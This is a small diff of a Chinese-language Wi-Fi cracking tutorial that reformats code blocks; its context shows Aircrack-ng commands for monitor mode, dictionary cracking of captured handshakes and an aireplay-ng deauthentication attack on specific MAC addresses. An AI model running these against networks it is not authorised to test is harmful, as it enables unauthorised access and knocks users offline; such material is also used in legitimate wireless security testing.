@@ -4,11 +4,11 @@
 
 当然，通过输入iwconfig查看也是可以滴。这个命令专用于查看无线网卡，不像ifconfig那样查看所有适配器。
 
-iwconfig 
+    iwconfig 
 	
 在Linux下，我们使用Aircrack-ng套装里的airmon-ng工具来实现，具体命令如下：
 
-    #airmon-ng start wlan0
+    airmon-ng start wlan0
     
 步骤3：探测无线网络，抓取无线数据包。
 
@@ -61,5 +61,4 @@ aircrack-ng  -w <字典文件> *.cap
 
 强制断开
 	aireplay-ng -0 1  -a 6C:E8:73:50:85:F0 -c 00:1B:77:BE:19:FC mon0
-
 
